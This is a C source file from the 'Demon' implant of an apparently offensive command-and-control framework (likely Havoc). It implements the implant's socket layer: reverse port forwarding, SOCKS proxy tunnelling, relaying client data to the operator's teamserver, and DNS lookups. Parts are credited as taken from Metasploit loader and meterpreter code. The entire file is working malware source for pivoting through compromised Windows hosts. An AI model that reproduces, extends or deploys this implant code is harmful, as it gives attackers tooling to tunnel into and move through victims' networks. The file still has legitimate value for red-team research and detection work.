#include <Demon.h>

#include <Core/MiniStd.h>

/* attempt to receive all the requested data from the socket
 * Took it from: https://github.com/rsmudge/metasploit-loader/blob/master/src/main.c#L41 */
DWORD RecvAll( SOCKET Socket, PVOID Buffer, DWORD Length )
{
    DWORD tret   = 0;
    DWORD nret   = 0;
    PVOID Start = Buffer;

    while ( tret < Length )
    {
        nret   = Instance.Win32.recv( Socket, Start, Length - tret, 0 );
        Start += nret;
        tret  += nret;

        if ( nret == SOCKET_ERROR )
        {
            PUTS( "recv Failed" )
            return 0;
        }
    }

    return tret;
}

/* Inspired from https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/stdapi/server/net/socket/tcp_server.c#L277 */
PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, DWORD LclAddr, DWORD LclPort, DWORD FwdAddr, DWORD FwdPort )
{
    PSOCKET_DATA Socket   = NULL;
    SOCKADDR_IN  SockAddr = { 0 };
    WSADATA      WsData   = { 0 };
    BOOL         IoBlock  = TRUE;
    DWORD        Result   = 0;

    PRINTF( "SocketNew => WinSock:[%x] Type:[%d] LclAddr:[%lx] LclPort:[%ld] FwdAddr:[%lx] FwdPort:[%ld]\n", WinSock, Type, LclAddr, LclPort, FwdAddr, FwdPort )

    /* if we specified SOCKET_TYPE_NONE then that means that
     * the caller only wants an object inserted into the socket linked list. */
    if ( ( Type != SOCKET_TYPE_NONE ) && ( Type != SOCKET_TYPE_CLIENT ) )
    {
        PUTS( "Init Windows Socket..." )

        /* Init Windows Socket. */
        if ( ( Result = Instance.Win32.WSAStartup( MAKEWORD( 2, 2 ), &WsData ) ) != 0 )
        {
            PRINTF( "WSAStartup Failed: %d\n", Result )

            /* cleanup and be gone. */
            Instance.Win32.WSACleanup();
            return NULL;
        }

        PUTS( "Create Socket..." )
        WinSock = Instance.Win32.WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL );
        if ( WinSock == INVALID_SOCKET )
        {
            PRINTF( "WSASocketA Failed: %d\n", NtGetLastError() )
            goto CLEANUP;
        }

        /* Set bind address and port */
        SockAddr.sin_addr.s_addr = HTONS32( LclAddr );
        SockAddr.sin_port        = HTONS16( LclPort );
        SockAddr.sin_family      = AF_INET;

        PRINTF( "SockAddr:  \n"
                " - Addr: %x\n"
                " - Port: %d\n",
                SockAddr.sin_addr.s_addr,
                SockAddr.sin_port
        )

        if ( Type == SOCKET_TYPE_REVERSE_PROXY )
        {
            /* connect to host:port */
            if ( Instance.Win32.connect( WinSock, &SockAddr, sizeof( SOCKADDR_IN ) ) == SOCKET_ERROR )
            {
                PRINTF( "connect failed: %d\n", NtGetLastError() )
                goto CLEANUP;
            }

            /* set socket to non blocking */
            if ( Instance.Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) == SOCKET_ERROR )
            {
                PRINTF( "ioctlsocket failed: %d\n", NtGetLastError() )
                goto CLEANUP;
            }

            PUTS( "Connected to host" )
        }
        else
        {
            /* set socket to non blocking */
            if ( Instance.Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) == SOCKET_ERROR )
            {
                PRINTF( "ioctlsocket failed: %d\n", NtGetLastError() )
                goto CLEANUP;
            }

            /* bind the socket */
            if ( Instance.Win32.bind( WinSock, &SockAddr, sizeof( SOCKADDR_IN ) ) == SOCKET_ERROR )
            {
                PRINTF( "bind failed: %d\n", NtGetLastError() )
                goto CLEANUP;
            }

            /* now listen... */
            if ( Instance.Win32.listen( WinSock, 1 ) == SOCKET_ERROR )
            {
                PRINTF( "listen failed: %d\n", NtGetLastError() )
                goto CLEANUP;
            }

            PUTS( "Started listening..." )
        }
    }

    /* Allocate our Socket object */
    Socket          = NtHeapAlloc( sizeof( SOCKET_DATA ) );
    Socket->ID      = RandomNumber32();
    Socket->Type    = Type;
    Socket->LclAddr = LclAddr;
    Socket->LclPort = LclPort;
    Socket->FwdAddr = FwdAddr;
    Socket->FwdPort = FwdPort;
    Socket->Socket  = WinSock;
    Socket->Next    = Instance.Sockets;

    Instance.Sockets = Socket;

    PRINTF( "New Socket object: %p\n", Socket )

    return Socket;

CLEANUP:
    if ( WinSock && WinSock != INVALID_SOCKET )
        Instance.Win32.closesocket( WinSock );

    return NULL;
}

/* Check for new connected clients. */
VOID SocketClients()
{
    PPACKAGE     Package = NULL;
    PSOCKET_DATA Socket  = NULL;
    PSOCKET_DATA Client  = NULL;
    SOCKET       WinSock = NULL;
    BOOL         IoBlock = TRUE;

    Socket = Instance.Sockets;

    /* First lets check for new clients */
    for ( ;; )
    {
        if ( ! Socket )
            break;

        /* Accept any connection made from the rportfwd */
        if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD )
        {
            /* accept connection */
            WinSock = Instance.Win32.accept( Socket->Socket, NULL, NULL );
            if ( WinSock != INVALID_SOCKET )
            {
                PRINTF( "WinSock : %p\n", WinSock )
                /* set socket to non blocking */
                if ( Instance.Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) != SOCKET_ERROR )
                {
                    /* Add the client to the socket linked list so we can read from it later on
                     * TODO: maybe ad a parent to know from what socket it came from so we can free those clients after we killed/removed the parent */
                    Client = SocketNew( WinSock, SOCKET_TYPE_CLIENT, Socket->LclAddr, Socket->LclPort, Socket->FwdAddr, Socket->FwdPort );

                    /* create socket response package */
                    Package = PackageCreate( DEMON_COMMAND_SOCKET );

                    /* socket package header */
                    PackageAddInt32( Package, SOCKET_COMMAND_OPEN );
                    PackageAddInt32( Package, Client->ID );

                    /* Local Host & Port data */
                    PackageAddInt32( Package, Client->LclAddr );
                    PackageAddInt32( Package, Client->LclPort );

                    /* Forward Host & Port data */
                    PackageAddInt32( Package, Client->FwdAddr );
                    PackageAddInt32( Package, Client->FwdPort );

                    /* Send the socket open request */
                    PackageTransmit( Package, NULL, NULL );
                    Package = NULL;
                }
                else
                {
                    PRINTF( "ioctlsocket failed: %d\n", NtGetLastError() )

                    /* close socket. */
                    Instance.Win32.closesocket( WinSock );
                }
            }
        }

        Socket = Socket->Next;
    }
}

/* Read data from the clients */
VOID SocketRead()
{
    PPACKAGE     Package = NULL;
    PSOCKET_DATA Socket  = NULL;
    BUFFER       Buffer  = { 0 };

    Socket = Instance.Sockets;

    /* First lets check for new clients */
    for ( ;; )
    {
        if ( ! Socket )
            break;

        /* reads data from connected clients/socks proxies */
        if ( Socket->Type == SOCKET_TYPE_CLIENT || Socket->Type == SOCKET_TYPE_REVERSE_PROXY )
        {
            /* check how much we can read */
            if ( Instance.Win32.ioctlsocket( Socket->Socket, FIONREAD, &Buffer.Length ) == SOCKET_ERROR )
            {
                PRINTF( "Failed to get the read size from %x : %d\n", Socket->ID, Socket->Type )

                /* Tell the Socket remover that it can remove this one.
                 * If the Socket type is type CLIENT then use TYPE_CLIENT_REMOVED
                 * else use TYPE_SOCKS_REMOVED to remove a socks proxy client */
                Socket->Type = ( Socket->Type == SOCKET_TYPE_CLIENT ) ?
                        SOCKET_TYPE_CLIENT_REMOVED :
                        SOCKET_TYPE_SOCKS_REMOVED  ;

                /* Next socket please */
                Socket = Socket->Next;

                continue;
            }

            if ( Buffer.Length > 0 )
            {
                Buffer.Buffer = NtHeapAlloc( Buffer.Length );
                Buffer.Length = RecvAll( Socket->Socket, Buffer.Buffer, Buffer.Length );

                if ( Buffer.Length > 0 )
                {
                    PRINTF( "Buffer.Length: %ld\n", Buffer.Length )

                    /* Create socket request package */
                    Package = PackageCreate( DEMON_COMMAND_SOCKET );

                    /* tell the teamserver to write to the socket of the forwarded host */
                    PackageAddInt32( Package, SOCKET_COMMAND_READ_WRITE );
                    PackageAddInt32( Package, Socket->ID );
                    PackageAddInt32( Package, Socket->Type );

                    /* add the data we read from the client socket */
                    PackageAddBytes( Package, Buffer.Buffer, Buffer.Length );

                    /* now let's send it */
                    PackageTransmit( Package, NULL, NULL );

                    /* free and clear out our buffer */
                    MemSet( Buffer.Buffer, 0, Buffer.Length );
                    NtHeapFree( Buffer.Buffer )
                    Buffer.Buffer = NULL;
                }
            }
        }

        Socket = Socket->Next;
    }
}

VOID SocketFree( PSOCKET_DATA Socket )
{
    PPACKAGE Package = NULL;

    /* do we want to remove a reverse port forward client ? */
    if ( Socket->Type == SOCKET_TYPE_CLIENT_REMOVED )
    {
        PUTS( "REVERSE PORT FORWARD CLIENT REMOVED" )

        /* create socket response package */
        Package = PackageCreate( DEMON_COMMAND_SOCKET );

        /* socket package header */
        PackageAddInt32( Package, SOCKET_COMMAND_RPORTFWD_REMOVE );
        PackageAddInt32( Package, Socket->ID );

        /* Local Host & Port data */
        PackageAddInt32( Package, Socket->LclAddr );
        PackageAddInt32( Package, Socket->LclPort );

        /* Forward Host & Port data */
        PackageAddInt32( Package, Socket->FwdAddr );
        PackageAddInt32( Package, Socket->FwdPort );

        /* Send the socket open request */
        PackageTransmit( Package, NULL, NULL );
        Package = NULL;
    }

    /* do we want to remove a socks proxy client ? */
    else if ( Socket->Type == SOCKET_TYPE_SOCKS_REMOVED )
    {
        PUTS( "SOCKS PROXY CLIENT REMOVED" )

        /* create socket response package */
        Package = PackageCreate( DEMON_COMMAND_SOCKET );

        /* socket package header */
        PackageAddInt32( Package, SOCKET_COMMAND_CLOSE );
        PackageAddInt32( Package, Socket->ID   );
        PackageAddInt32( Package, SOCKET_TYPE_REVERSE_PROXY );

        /* Send the socket open request */
        PackageTransmit( Package, NULL, NULL );
        Package = NULL;
    }

    if ( Socket->Socket )
    {
        Instance.Win32.closesocket( Socket->Socket );
        Socket->Socket = NULL;
    }

    MemSet( Socket, 0, sizeof( SOCKET_DATA ) );
    NtHeapFree( Socket )
    Socket = NULL;
}

VOID SocketPush()
{
    PSOCKET_DATA Socket = NULL;
    PSOCKET_DATA SkLast = NULL;

    /* check for new clients */
    SocketClients();

    /* Read data from the clients and send it to our server/forwarded host */
    SocketRead();

    /* kill every dead/removed socket
     * TODO: re-work on this.
     *       make that after the socket got used close it.
     *       maybe add a timeout ? after the socket didn't got used after a certain period of time. */
    Socket = Instance.Sockets;
    for ( ;; )
    {
        if ( ! Socket )
            break;

        if ( Socket->Type == SOCKET_TYPE_CLIENT_REMOVED || Socket->Type == SOCKET_TYPE_SOCKS_REMOVED )
        {
            /* we are at the beginning. */
            if ( ! SkLast )
            {
                Instance.Sockets = Socket->Next;
                SocketFree( Socket );
                Socket = NULL;
            }
            else
            {
                SkLast->Next = Socket->Next;
                SocketFree( Socket );
                SkLast = NULL;
            }
        }
        else
        {
            SkLast = Socket;
            Socket = Socket->Next;
        }
    }
}

/*!
 * Query the IP from the specified domain
 * @param Domain
 * @return Ip address
 */
DWORD DnsQueryIP( LPSTR Domain )
{
    DNS_STATUS  DnsStatus = { 0 };
    PDNS_RECORD DnsRecord = NULL;

    PRINTF( "Query Domain: %s\n", Domain )

    DnsStatus = Instance.Win32.DnsQuery_A( Domain, DNS_TYPE_A, DNS_QUERY_BYPASS_CACHE, NULL, &DnsRecord, NULL);
    if ( DnsStatus != ERROR_SUCCESS || DnsRecord == NULL )
    {
        PRINTF( "DnsQuery_A Failed: %d\n", NtGetLastError() )
        return 0;
    }

    return DnsRecord->Data.A.IpAddress;
}